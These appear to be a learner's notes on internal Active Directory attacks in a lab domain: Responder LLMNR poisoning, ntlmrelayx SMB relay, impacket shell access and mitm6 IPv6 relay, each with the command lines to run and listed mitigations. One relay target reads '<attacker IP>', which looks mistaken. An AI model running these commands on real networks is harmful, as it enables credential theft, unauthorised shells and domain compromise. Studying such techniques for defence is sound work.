LLMNR poisoning 
	responder script
		usage: sudo responder -I <interface> -dwP
		
	Mitigation: disabling LLMNR and NBT-NS (enable policy turn off multicast name resolution), use strong passwords over 14 characters in length and complex.

SMB replay attacks
	requirements to work: smb signing should be disabled or can be enabled but not enforced on our target workstation. 
	check: nmap --script=smb2-security-mode.nse -p445 <network addr> -Pn 
	first run responder script then ntlmrelayx script
	ntlmrelayx script
		usage: ntlmrelayx.py -tf targets.txt -smb2support
			-I to get an interactive shell and connect to it using nc.
			-c to run a command such as "whoami"
			
		Mitigation: Enabling SMB signing on all devices, disabling NTLM auth on network, account tiering, local admin restriction. 

Shell access: 
	psexec module on metasploit. 
	can use impacket scripts:
		psexec.py
		wmiexec.py
		smbexec.py

IPv6 attacks:
	Essentially we act as a DNS server for IPv6.
	first setup ntlmrelayx but instead use command
		usage: ntlmrelayx.py -6 -t ldaps://<attacker IP> -wh fakewap.marvel.local -l lootme
		- creates a folder called lootme with dumps.
	After we run mitm6	
		usage: sudo mitm6 -d marvel.local
		run max upto 5-10min or it can cause network issues.
		if someone such as administrator performs successful logon to a computer then the attack is successful and will can create a user on the domain which we can use to access.
	Mitigation: Disable IPv6 (can cause issues), moving admin users to protected users group or marking account as sensitive and non delegated to prevent impersation, disable WPAD if not in use, enabling LDAP signing and LDAP channel binding.

